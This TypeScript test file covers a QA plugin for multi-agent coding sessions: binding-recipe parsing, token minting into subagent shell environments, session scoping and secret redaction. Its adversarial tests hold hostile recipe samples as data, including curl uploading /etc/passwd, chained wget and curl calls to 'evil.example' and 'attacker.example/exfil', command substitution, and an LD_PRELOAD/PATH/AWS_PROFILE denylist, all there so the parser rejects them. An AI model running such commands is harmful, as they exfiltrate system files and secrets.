import { describe, it, expect, afterEach } from "vitest"
import { BindingsStore } from "../../../src/modules/qa/bindings-store.js"
import { QaRunState } from "../../../src/modules/qa/qa-run-state.js"
import { SessionAgentRegistry, makeShellEnvHook } from "../../../src/modules/qa/shell-env-hook.js"
import { makeExecuteRecipeHandler } from "../../../src/modules/qa/execute-recipe.js"
import { makeRecordInputHandler } from "../../../src/modules/qa/record-input.js"
import { parseBindings } from "../../../src/modules/qa/binding-parser.js"
import { scrubSecrets } from "../../../src/modules/qa/scrubber.js"
import {
  clearDispatchExtensions,
  getDispatchExtensions,
} from "../../../src/modules/_shared/dispatch-extensions.js"
import { AppVerkQAPlugin } from "../../../src/modules/qa/index.js"
import { dispatchParallel } from "../../../src/modules/coordinator/dispatch.js"
import type { PollerMessage } from "../../../src/modules/coordinator/poller.js"

describe("end-to-end happy path", () => {
  it("user pastes inputs → recipe mints token → BE-Zmora bash sees QA_BIND_TOKEN", async () => {
    const planText = `
## Setup
**Bindings:**
- \`QA_BIND_TOKEN\` (secret) — JWT
  - Inputs: \`$TEST_USER_EMAIL\`, \`$TEST_USER_PASSWORD\`, \`$URL\`
  - Egress: \`$URL\`
  - Recipe:
    \`\`\`bash
    curl --data-urlencode "email=$TEST_USER_EMAIL" --data-urlencode "password=$TEST_USER_PASSWORD" "$URL" | jq -er .access_token
    \`\`\`
`
    const parsed = parseBindings(planText)
    expect(parsed.status).toBe("ok")
    if (parsed.status !== "ok") return

    const store = new BindingsStore()
    const state = new QaRunState()
    const registry = new SessionAgentRegistry()
    const parentID = "perun-1"
    state.storePlan(parentID, parsed.bindings)

    const fakeBash = async (_cmd: string, env: Record<string, string>) => {
      if (env.TEST_USER_EMAIL === "foo@bar.com" && env.TEST_USER_PASSWORD === "Secret123!") {
        return { exitCode: 0, stdout: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.signatureLongAndEntropicXYZ\n", stderr: "" }
      }
      return { exitCode: 1, stdout: "", stderr: "auth failed" }
    }

    const recordInput = makeRecordInputHandler({ store, state, resolveParentID: async () => parentID })
    const executeRecipe = makeExecuteRecipeHandler({
      store, state, runBash: fakeBash,
      resolveParentID: async () => parentID,
      processEnv: { URL: "https://api.example.com" },
      nowMs: () => Date.now(),
    })

    // Simulate user paste.
    expect((await recordInput({ name: "TEST_USER_EMAIL", value: "foo@bar.com" }, { sessionID: parentID })).status).toBe("ok")
    expect((await recordInput({ name: "TEST_USER_PASSWORD", value: "Secret123!" }, { sessionID: parentID })).status).toBe("ok")

    // Setup-zmora invokes execute_recipe.
    const result = await executeRecipe({ binding_name: "QA_BIND_TOKEN" }, { sessionID: "zmora-setup-child" })
    expect(result.status).toBe("ok")

    // BE-Zmora's bash should see the token via shell.env hook.
    registry.register("zmora-be-child", "zmora-be")
    const hook = makeShellEnvHook({
      store, registry,
      resolveParentID: async () => parentID,
    })
    const env: Record<string, string> = {}
    await hook({ sessionID: "zmora-be-child", cwd: "/" }, { env })
    expect(env.QA_BIND_TOKEN).toBe("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.signatureLongAndEntropicXYZ")

    // Scrubber redacts the token if it appears in a Zmora result.
    const scrubbed = scrubSecrets("test passed with token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.signatureLongAndEntropicXYZ", parentID, store)
    expect(scrubbed).toContain("[REDACTED:QA_BIND_TOKEN]")
    expect(scrubbed).not.toContain("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.signatureLongAndEntropicXYZ")
  })
})

describe("adversarial — malicious plan", () => {
  it("rejects plan with multi-curl exfil via newline", () => {
    const plan = `
## Setup
**Bindings:**
- \`QA_BIND_TOKEN\` (secret) — bad
  - Inputs: \`$URL\`
  - Egress: \`$URL\`
  - Recipe:
    \`\`\`bash
    curl "$URL"
    curl "http://evil.example" -d "test"
    \`\`\`
`
    expect(parseBindings(plan).status).toBe("error")
  })

  it("rejects --upload-file flag in recipe", () => {
    const plan = `
## Setup
**Bindings:**
- \`QA_BIND_TOKEN\` (secret) — bad
  - Inputs: \`$URL\`
  - Egress: \`$URL\`
  - Recipe:
    \`\`\`bash
    curl --upload-file /etc/passwd "$URL"
    \`\`\`
`
    expect(parseBindings(plan).status).toBe("error")
  })

  it("rejects $() command substitution in recipe", () => {
    const plan = `
## Setup
**Bindings:**
- \`QA_BIND_TOKEN\` (secret) — bad
  - Inputs: \`$URL\`
  - Egress: \`$URL\`
  - Recipe:
    \`\`\`bash
    curl "$URL" -d "$(echo evil)"
    \`\`\`
`
    expect(parseBindings(plan).status).toBe("error")
  })

  it("rejects && chained commands in recipe", () => {
    const plan = `
## Setup
**Bindings:**
- \`QA_BIND_TOKEN\` (secret) — bad
  - Inputs: \`$URL\`
  - Egress: \`$URL\`
  - Recipe:
    \`\`\`bash
    curl "$URL" && wget "http://evil"
    \`\`\`
`
    expect(parseBindings(plan).status).toBe("error")
  })

  it("rejects curl pointing to non-Egress host", () => {
    const plan = `
## Setup
**Bindings:**
- \`QA_BIND_TOKEN\` (secret) — bad
  - Inputs: \`$URL\`
  - Egress: \`$URL\`
  - Recipe:
    \`\`\`bash
    curl "https://attacker.example/exfil"
    \`\`\`
`
    expect(parseBindings(plan).status).toBe("error")
  })
})

describe("adversarial — record_input denylist", () => {
  it("rejects PATH from user-paste", async () => {
    const store = new BindingsStore()
    const state = new QaRunState()
    const handler = makeRecordInputHandler({ store, state, resolveParentID: async () => "p" })
    const result = await handler({ name: "PATH", value: "/tmp" }, { sessionID: "p" })
    expect(result.status).toBe("rejected")
  })

  it("rejects LD_PRELOAD from user-paste", async () => {
    const store = new BindingsStore()
    const state = new QaRunState()
    const handler = makeRecordInputHandler({ store, state, resolveParentID: async () => "p" })
    const result = await handler({ name: "LD_PRELOAD", value: "/tmp/x.so" }, { sessionID: "p" })
    expect(result.status).toBe("rejected")
  })

  it("rejects AWS_PROFILE from user-paste (denylist prefix)", async () => {
    const store = new BindingsStore()
    const state = new QaRunState()
    const handler = makeRecordInputHandler({ store, state, resolveParentID: async () => "p" })
    const result = await handler({ name: "AWS_PROFILE", value: "prod" }, { sessionID: "p" })
    expect(result.status).toBe("rejected")
  })
})

describe("adversarial — execute_recipe write path constraints", () => {
  it("execute_recipe cannot register non-QA_BIND_ name (writeBinding layer enforces)", () => {
    // The binding-parser rejects non-QA_BIND_* names at plan-load time, so a hostile
    // plan cannot smuggle a PATH binding through. As a defense-in-depth regression
    // guard, writeBinding itself rejects too.
    const store = new BindingsStore()
    const result = store.writeBinding("p", "PATH", "/tmp", "plain", "minted-recipe")
    expect(result.status).toBe("error")
  })
})

describe("adversarial — shell.env hook scoping", () => {
  it("does NOT leak bindings to a non-zmora-* agent session", async () => {
    const store = new BindingsStore()
    const registry = new SessionAgentRegistry()
    store.writeBinding("perun-1", "QA_BIND_TOKEN", "supersecret", "secret", "minted-recipe")

    // Unrelated agent (e.g. user's general chat) in same OpenCode process.
    registry.register("other-chat-session", "general-chat")
    const hook = makeShellEnvHook({
      store, registry,
      resolveParentID: async () => "perun-1",
    })
    const env: Record<string, string> = {}
    await hook({ sessionID: "other-chat-session", cwd: "/" }, { env })
    expect(env.QA_BIND_TOKEN).toBeUndefined()
  })
})

/**
 * Wire-up regression for COMP-001: the previous integration test directly
 * called `state.storePlan(...)` and `registry.register(...)`, masking the
 * fact that production never invoked either. This suite proves the QA
 * plugin's factory + the coordinator's `dispatchParallel` wire those calls
 * end-to-end via:
 *
 *   1. `parse_plan` tool — populates QaRunState (replaces direct storePlan).
 *   2. `registerDispatchExtensions` — exposes registry + scrubber.
 *   3. `dispatchParallel` — consumes extensions: registry.register fires per
 *      child session; scrubber redacts secret values from results.
 *   4. `shell.env` hook — uses the registered child session to find bindings.
 */
/**
 * Build a minimal `ToolContext` good enough for the QA plugin's tools. Real
 * production contexts carry more fields (abort signal, ask permission, etc.),
 * but the QA tools only read `sessionID`; the rest is stubbed to satisfy the
 * type system in tests.
 */
function makeToolContext(sessionID: string): never {
  return {
    sessionID,
    messageID: "",
    agent: "Perun - Coordinator",
    directory: process.cwd(),
    worktree: process.cwd(),
    abort: new AbortController().signal,
    metadata: () => undefined,
    ask: async () => undefined,
  } as never
}

describe("COMP-001 wire-up: parse_plan + dispatch + shell.env + scrub", () => {
  afterEach(() => {
    // Plugin-process singletons live for the OpenCode lifetime; tests must
    // explicitly reset to avoid cross-test contamination.
    clearDispatchExtensions()
  })

  it("end-to-end pipeline works without any test-only state setup", async () => {
    // 1. Construct the plugin via its factory — same as production.
    const pluginInput = {
      client: {
        session: {
          // resolveParentID looks up child→parent — return parentID for both
          // parent and (hypothetical) zmora child sessions.
          get: async () => ({ data: { parentID: undefined } }),
        },
      },
    } as never
    const pluginResult = await AppVerkQAPlugin(pluginInput)

    // 2. Verify the plugin registered dispatch extensions. After ARCH-004 the
    // plugin exposes a `scrubberFactory` (snapshot-pinned, race-safe) instead
    // of a live-read `scrubber`.
    const ext = getDispatchExtensions()
    expect(ext.sessionAgentRegistry).toBeDefined()
    expect(ext.scrubberFactory).toBeDefined()

    // 3. Invoke parse_plan as Perun would, via the public tool interface.
    const planText = `
## Setup
**Bindings:**
- \`QA_BIND_TOKEN\` (secret) — JWT
  - Inputs: \`$TEST_USER_EMAIL\`, \`$TEST_USER_PASSWORD\`, \`$URL\`
  - Egress: \`$URL\`
  - Recipe:
    \`\`\`bash
    curl --data-urlencode "email=$TEST_USER_EMAIL" --data-urlencode "password=$TEST_USER_PASSWORD" "$URL" | jq -er .access_token
    \`\`\`
`
    const parsePlanTool = pluginResult.tool?.parse_plan
    expect(parsePlanTool).toBeDefined()
    const parsePlanResult = await parsePlanTool!.execute(
      { plan: planText },
      makeToolContext("perun-session-1"),
    )
    expect(parsePlanResult).toContain('"status":"ok"')
    expect(parsePlanResult).toContain("QA_BIND_TOKEN")

    // 4. Drive dispatchParallel through its public API with the SAME extensions
    //    the coordinator's tool wrapper would source. The specialist is faked
    //    but the wiring code under test (preflight/registry/scrubber threading)
    //    is real.
    const childSessionID = "zmora-be-child-1"
    const tokenValue = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.signatureLongAndEntropicXYZ"

    // Pre-seed the bindings store directly with a token — simulates a prior
    // execute_recipe call (which has its own coverage). The wire-up under
    // test is downstream of that: scrubber must redact this value when it
    // appears in a result.
    //
    // We reach into the registered singleton's registry to confirm dispatch
    // registered (sessionID → agentName).
    const fakeSpecialist = {
      async startTask(): Promise<string> {
        return childSessionID
      },
      async fetchMessages(): Promise<PollerMessage[]> {
        return [
          {
            role: "assistant",
            content: `result with token=${tokenValue}`,
            finish_reason: "end_turn",
          },
        ]
      },
      async abortTask(): Promise<void> {
        /* no-op */
      },
    }

    // Seed the BindingsStore via the BindingsStore behind the singleton.
    // The plugin closes over its own `store` reference — we cannot reach it
    // directly without exposing internals. Instead, drive it via parse_plan +
    // record_input + execute_recipe in the real order. For this regression
    // we only need to verify wire-up, not value materialisation, so we set
    // a binding via the record_input tool path (which DOES expose itself).
    const recordInputTool = pluginResult.tool?.record_input
    expect(recordInputTool).toBeDefined()
    // The scrubber operates on the live BindingsStore, so a user-paste
    // binding will participate in scrub. Use a high-entropy value to
    // exercise both the exact and partial replace paths.
    await recordInputTool!.execute(
      { name: "QA_BIND_LEAKED", value: tokenValue },
      makeToolContext("perun-session-1"),
    )

    const dispatchResult = await dispatchParallel({
      tasks: [{ name: "zmora-be", prompt: "test" }],
      agentRegistry: { "zmora-be": { mode: "subagent" } },
      specialist: fakeSpecialist,
      pollIntervalMs: 5,
      parentSessionID: "perun-session-1",
      sessionAgentRegistry: ext.sessionAgentRegistry,
      scrubberFactory: ext.scrubberFactory,
    })

    // Assertion 1: dispatch succeeded.
    expect(dispatchResult).toHaveLength(1)
    expect(dispatchResult[0]?.status).toBe("success")

    // Assertion 2: registry.register was invoked by dispatch — the child
    // session is now resolvable to its agent name. This is the gap COMP-001
    // identified: previously this never happened in production.
    expect(ext.sessionAgentRegistry!.lookup(childSessionID)).toBe("zmora-be")

    // Assertion 3: scrubber replaced the token in the result before it
    // reached the dispatch return value. Previously the scrubber was wired
    // but never invoked because parentSessionID was not threaded.
    expect(dispatchResult[0]?.result).toContain("[REDACTED:")
    expect(dispatchResult[0]?.result).not.toContain(tokenValue)
  })

  it("parse_plan returns error for malformed plan and does NOT populate state", async () => {
    const pluginInput = {
      client: {
        session: {
          get: async () => ({ data: { parentID: undefined } }),
        },
      },
    } as never
    const pluginResult = await AppVerkQAPlugin(pluginInput)
    const parsePlanTool = pluginResult.tool?.parse_plan
    expect(parsePlanTool).toBeDefined()

    const badPlan = `
## Setup
**Bindings:**
- \`QA_BIND_TOKEN\` (secret) — bad
  - Inputs: \`$URL\`
  - Egress: \`$URL\`
  - Recipe:
    \`\`\`bash
    curl "$URL" -d "$(echo exfil)"
    \`\`\`
`
    const result = await parsePlanTool!.execute(
      { plan: badPlan },
      makeToolContext("perun-session-bad"),
    )
    expect(result).toContain('"status":"error"')
  })

  it("parse_plan with no Setup section returns ok with empty bindings list", async () => {
    const pluginInput = {
      client: {
        session: {
          get: async () => ({ data: { parentID: undefined } }),
        },
      },
    } as never
    const pluginResult = await AppVerkQAPlugin(pluginInput)
    const parsePlanTool = pluginResult.tool?.parse_plan
    expect(parsePlanTool).toBeDefined()

    const result = await parsePlanTool!.execute(
      { plan: "# Plan with no setup\n\n## FE Test Scenarios\n### FE-01: nothing\n" },
      makeToolContext("perun-session-nosetup"),
    )
    expect(result).toContain('"status":"ok"')
    expect(result).toContain('"bindings":[]')
  })
})
